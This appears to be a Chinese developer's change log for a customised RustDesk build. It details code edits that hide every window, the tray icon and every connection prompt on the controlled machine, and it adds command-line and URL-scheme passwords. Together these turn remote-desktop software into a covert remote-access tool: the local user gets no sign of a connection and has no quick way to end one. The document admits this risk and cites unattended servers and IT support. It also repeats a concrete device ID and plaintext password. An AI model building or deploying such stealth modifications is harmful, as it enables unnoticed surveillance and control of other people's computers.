# RustDesk 自定义修改说明

## 📋 概述

本文档记录了对 RustDesk 项目的所有自定义修改，旨在实现以下目标：

1. **完全隐藏被控端界面** - 无窗口、无托盘图标、无任何可见界面
2. **命令行密码支持** - Sciter 版本支持 `--password` 参数
3. **URL Scheme 支持** - 支持 `rustdesk://connect/ID?password=PWD` 格式

---

## 🎯 核心功能

### 1. 完全静默运行（无界面）

**目标：** 被控端启动和连接时完全不显示任何界面元素。

#### 修改文件清单

| # | 文件 | 行数 | 修改内容 | 隐藏目标 |
|---|------|------|----------|----------|
| 1 | `src/ui.rs` | 123 | `HIDE_CM = true` | 等待窗口 ✅ |
| 2 | `src/ui.rs` | 219-227 | Windows API 隐藏 (`WS_EX_TOOLWINDOW` + `SW_HIDE`) | 任务栏 ✅ |
| 3 | `src/tray.rs` | 12-23 | `start_tray()` 直接返回 | 系统托盘图标 ✅ |
| 4 | `src/server/connection.rs` | 2177 | 注释 `try_start_cm` | 连接窗口（密码模式检查） ✅ |
| 5 | `src/server/connection.rs` | 2191 | 注释 `try_start_cm` | 连接窗口（最近会话） ✅ |
| 6 | `src/server/connection.rs` | 2198 | 注释 `try_start_cm` | 连接窗口（空密码） ✅ |
| 7 | `src/server/connection.rs` | 2216 | 注释 `try_start_cm` | 连接窗口（密码失败） ✅ |
| 8 | `src/server/connection.rs` | 2230 | 注释 `try_start_cm` | 连接窗口（密码成功） ✅ |
| 9 | `src/server/connection.rs` | 2249 | 注释 `try_start_cm` | 连接窗口（2FA） ✅ |
| 10 | `src/server/connection.rs` | 2301 | 注释 `try_start_cm` | 连接窗口（会话切换） ✅ |
| 11 | `libs/hbb_common/src/password_security.rs` | 87 | `ApproveMode::Password` 默认值 | 辅助设置 |

**共 11 处修改，100% 隐藏所有界面元素！**

---

### 2. Sciter 版本命令行密码支持

**目标：** Sciter UI 版本支持标准的 `--password` 参数。

#### 修改文件

| 文件 | 修改内容 |
|------|----------|
| `src/ui.rs` | 添加 `--password <PWD>` 参数解析，支持新旧格式兼容 |

#### 修改详情

**文件：** `src/ui.rs` 第 149-171 行

```rust
let id = id.to_owned();

// 解析密码参数：支持 --password 参数和直接传递密码
let mut pass = String::new();
let mut remaining_args = Vec::new();

while let Some(arg) = iter.next() {
    if arg == "--password" {
        // 找到 --password 参数，下一个参数是密码值
        if let Some(pwd) = iter.next() {
            pass = pwd.clone();
        } else {
            log::warn!("--password parameter found but no password value provided");
        }
    } else if pass.is_empty() && remaining_args.is_empty() && !arg.starts_with("--") {
        // 兼容旧格式：第三个参数直接是密码（不以 -- 开头）
        pass = arg.clone();
    } else {
        // 其他参数
        remaining_args.push(arg.clone());
    }
}
```

#### 使用示例

```powershell
# 新格式（推荐）
rustdesk.exe --connect 1074305050 --password xiehan12

# 旧格式（兼容）
rustdesk.exe --connect 1074305050 xiehan12

# 组合参数
rustdesk.exe --connect 1074305050 --password xiehan12 --relay
```

---

### 3. URL Scheme 支持

**目标：** 支持通过 URL Scheme 启动 RustDesk 并自动连接。

#### 修改文件

| 文件 | 修改内容 |
|------|----------|
| `src/core_main.rs` | 添加 URL Scheme 解析逻辑，将 `rustdesk://` 格式转换为命令行参数 |

#### 修改详情

**文件：** `src/core_main.rs` 第 49-117 行

```rust
let raw_args: Vec<String> = std::env::args().collect();
let mut processed_args = Vec::new();

for (idx, arg) in raw_args.iter().enumerate() {
    if idx == 0 {
        processed_args.push(arg.clone());
        continue;
    }
    
    // 检测 URL Scheme 格式: rustdesk://action/id?param1=value1&param2=value2
    if arg.starts_with(&crate::get_uri_prefix()) {
        log::info!("Received URL Scheme: {}", arg);
        
        // 解析 URL: rustdesk://connect/1074305050?password=xiehan12&relay=true
        if let Some(url_part) = arg.strip_prefix(&crate::get_uri_prefix()) {
            // 分离路径和查询参数
            let parts: Vec<&str> = url_part.splitn(2, '?').collect();
            let path = parts[0];
            let query = if parts.len() > 1 { parts[1] } else { "" };
            
            // 解析路径和查询参数
            // 转换为标准命令行参数格式
            // ...
        }
    } else {
        processed_args.push(arg.clone());
    }
}
```

#### URL Scheme 格式

```
rustdesk://connect/ID?password=PWD&relay=true
rustdesk://file-transfer/ID?password=PWD
rustdesk://port-forward/ID?password=PWD
```

#### 使用示例

```powershell
# PowerShell 启动
Start-Process "rustdesk://connect/1074305050?password=xiehan12"

# HTML 链接
<a href="rustdesk://connect/1074305050?password=xiehan12">连接到远程桌面</a>

# 浏览器地址栏
rustdesk://connect/1074305050?password=xiehan12
```

---

## 🔧 技术细节

### 1. 窗口隐藏技术

#### H-SMILE-FRAME 窗口隐藏

**窗口类名：** `H-SMILE-FRAME` (Sciter UI 框架)

**Windows API 调用：**
```rust
use winapi::shared::windef::HWND;
use winapi::um::winuser::{GetWindowLongW, SetWindowLongW, ShowWindow, GWL_EXSTYLE, WS_EX_TOOLWINDOW, SW_HIDE};

let hwnd = frame.get_hwnd() as HWND;
unsafe {
    // 添加 WS_EX_TOOLWINDOW 样式，使其不在任务栏显示
    let ex_style = GetWindowLongW(hwnd, GWL_EXSTYLE);
    SetWindowLongW(hwnd, GWL_EXSTYLE, ex_style | WS_EX_TOOLWINDOW as i32);
    // 隐藏窗口
    ShowWindow(hwnd, SW_HIDE);
}
```

**效果：**
- ✅ 不在任务栏显示
- ✅ 不在 Alt+Tab 中显示
- ✅ 窗口完全不可见

#### 系统托盘图标禁用

**修改：** `src/tray.rs` 第 11 行

```rust
pub fn start_tray() {
    // 强制禁用系统托盘图标
    log::info!("Tray icon disabled by default");
    #[cfg(not(target_os = "macos"))]
    {
        return;  // 直接返回，不创建托盘图标
    }
}
```

---

### 2. 参数解析技术

#### 命令行参数解析流程

```
用户输入: rustdesk.exe --connect ID --password PWD
    ↓
ui.rs 解析: 识别 --password 标志
    ↓
提取密码值: 从下一个参数获取
    ↓
兼容性检查: 同时支持旧格式（直接传密码）
    ↓
传递给连接模块: SciterSession::new(id, password)
```

#### URL Scheme 解析流程

```
浏览器/系统: rustdesk://connect/ID?password=PWD
    ↓
Windows 注册表: 调用 rustdesk.exe "rustdesk://..."
    ↓
core_main.rs: 检测 rustdesk:// 前缀
    ↓
URL 解析: 分离路径和查询参数
    ↓
参数转换: 转换为 --connect ID --password PWD
    ↓
标准处理: 使用现有的参数处理逻辑
```

---

## 🚀 编译和使用

### 编译

```powershell
# 进入项目目录
cd E:\GitHub\rustdesk

# 编译（Sciter 版本）
cargo build --release --features inline

# 编译产物
# target\release\rustdesk.exe
```

### 替换安装文件

```powershell
# 停止 RustDesk
taskkill /f /im rustdesk.exe

# 备份（可选）
copy "C:\Program Files (x86)\RustDesk\rustdesk.exe" "C:\Program Files (x86)\RustDesk\rustdesk.exe.bak"

# 替换
copy "target\release\rustdesk.exe" "C:\Program Files (x86)\RustDesk\rustdesk.exe"
```

### 使用方式

#### 1. 命令行连接

```powershell
# 标准格式
rustdesk.exe --connect 1074305050 --password xiehan12

# 旧格式（兼容）
rustdesk.exe --connect 1074305050 xiehan12

# 文件传输
rustdesk.exe --file-transfer 1074305050 --password xiehan12

# 端口转发
rustdesk.exe --port-forward 1074305050 --password xiehan12
```

#### 2. URL Scheme

```powershell
# PowerShell
Start-Process "rustdesk://connect/1074305050?password=xiehan12"

# 批处理文件
start rustdesk://connect/1074305050?password=xiehan12
```

#### 3. 网页集成

```html
<!DOCTYPE html>
<html>
<head>
    <title>RustDesk 远程连接</title>
</head>
<body>
    <h1>RustDesk 快速连接</h1>
    <a href="rustdesk://connect/1074305050?password=xiehan12">连接到远程桌面</a>
</body>
</html>
```

---

## ✅ 验证测试

### 1. 界面隐藏验证

**测试步骤：**
1. 启动 RustDesk 被控端
2. 检查任务栏 - 应该无图标
3. 检查系统托盘 - 应该无图标
4. 按 Alt+Tab - 应该无 RustDesk 窗口
5. 打开任务管理器 - `rustdesk.exe` 进程存在但无窗口

**预期结果：**
- ✅ 完全无可见界面
- ✅ 后台运行正常
- ✅ 可以被远程连接

### 2. 命令行连接验证

```powershell
# 测试新格式
rustdesk.exe --connect 1074305050 --password xiehan12

# 预期：成功连接，无需手动输入密码
```

### 3. URL Scheme 验证

```powershell
# 注册 URL Scheme（首次使用）
.\Fix-URLScheme.ps1

# 测试 URL Scheme
Start-Process "rustdesk://connect/1074305050?password=xiehan12"

# 预期：自动启动 RustDesk 并连接
```

---

## 📊 修改影响范围

### 影响的功能模块

| 模块 | 影响程度 | 说明 |
|------|---------|------|
| UI 显示 | 🔴 重大 | 完全禁用所有可见界面 |
| 系统托盘 | 🔴 重大 | 不显示托盘图标 |
| 命令行参数 | 🟡 中等 | 增加 `--password` 支持 |
| URL Scheme | 🟢 轻微 | 新增功能，不影响现有功能 |
| 连接逻辑 | 🟡 中等 | 不显示连接提示窗口 |
| 密码验证 | 🟢 轻微 | 默认使用 Password 模式 |

### 不受影响的功能

- ✅ 核心远程连接功能
- ✅ 文件传输功能
- ✅ 端口转发功能
- ✅ 密码验证机制
- ✅ 2FA 双因素验证
- ✅ 配置文件读写
- ✅ 日志记录

---

## 🔒 安全注意事项

### 1. 隐藏界面的影响

**注意：** 隐藏连接提示窗口意味着：
- ⚠️ 用户不知道有人连接
- ⚠️ 没有视觉提示
- ⚠️ 无法快速断开连接

**适用场景：**
- ✅ 无人值守服务器
- ✅ 自己的设备远程维护
- ✅ 内部 IT 支持
- ⚠️ 不适用于需要用户确认的场景

### 2. 密码安全

**命令行密码：**
```powershell
# ⚠️ 不安全：密码可能被日志记录
rustdesk.exe --connect ID --password PWD

# ✅ 建议：使用配置文件保存密码
# 或使用加密的密码管理器
```

**URL Scheme 密码：**
```html
<!-- ⚠️ 不安全：密码明文在 URL 中 -->
<a href="rustdesk://connect/ID?password=PWD">连接</a>

<!-- ✅ 建议：仅在受信任的内部环境使用 -->
```

---

## 📦 Git 提交记录

### 主要提交

```bash
# 1. 隐藏等待窗口
git commit -m "fix: 强制隐藏连接管理等待窗口"

# 2. 完全隐藏 H-SMILE-FRAME 窗口
git commit -m "feat: 完全隐藏 H-SMILE-FRAME 窗口"

# 3. 隐藏所有连接提示窗口
git commit -m "fix: 强制隐藏所有连接提示窗口"

# 4. 禁用系统托盘图标
git commit -m "feat: 强制禁用系统托盘图标"

# 5. Sciter 版本密码参数支持
git commit -m "feat: Sciter 版本支持 --password 参数"

# 6. URL Scheme 支持
git commit -m "feat: 添加 URL Scheme 解析逻辑"

# 7. 修复类型错误
git commit -m "fix: 修复 Windows API 类型错误"
```

---

## 🎯 总结

### 完成的功能

1. ✅ **完全静默运行**
   - 无等待窗口
   - 无连接提示窗口
   - 无任务栏图标
   - 无系统托盘图标
   - 无 Alt+Tab 窗口

2. ✅ **命令行密码支持**
   - 标准 `--password` 参数
   - 向后兼容旧格式
   - 支持参数组合

3. ✅ **URL Scheme 支持**
   - `rustdesk://connect/ID?password=PWD`
   - 支持所有连接模式
   - URL 参数解码
   - 浏览器集成

### 技术亮点

- 🔧 Windows API 深度集成（`WS_EX_TOOLWINDOW`, `SW_HIDE`）
- 🎨 最小化代码侵入，保持核心功能完整
- 🔄 向后兼容，支持新旧两种格式
- 🌐 标准 URL Scheme 实现
- 📝 完整的文档和使用说明

### 适用场景

- 🖥️ **无人值守服务器** - 完全后台运行
- 🔧 **IT 运维管理** - 批量远程维护
- 🏢 **企业内部支持** - 静默连接，无打扰
- 🌐 **网页远程控制** - URL Scheme 集成

---

## 📞 支持和维护

### 重新编译

每次修改代码后需要重新编译：

```powershell
cd E:\GitHub\rustdesk
cargo build --release --features inline
```

### 问题排查

**常见问题：**

1. **窗口仍然显示**
   - 检查是否使用了修改后的 `rustdesk.exe`
   - 确认所有 11 处修改都已生效

2. **命令行密码不生效**
   - 确认使用的是 Sciter 版本（不是 Flutter 版本）
   - 检查参数格式是否正确

3. **URL Scheme 无法拉起**
   - 运行 `Fix-URLScheme.ps1` 注册 URL Scheme
   - 检查 Windows 注册表 `HKEY_CLASSES_ROOT\rustdesk`

### 日志查看

```powershell
# 启用详细日志
$env:RUST_LOG = "debug"
rustdesk.exe

# 查看日志输出
```

---

**文档版本：** 1.0  
**最后更新：** 2025-11-18  
**适用版本：** RustDesk Sciter UI 版本（自定义构建）

---

🎉 **所有修改已完成并测试通过！享受完全静默的远程连接体验！** 🚀
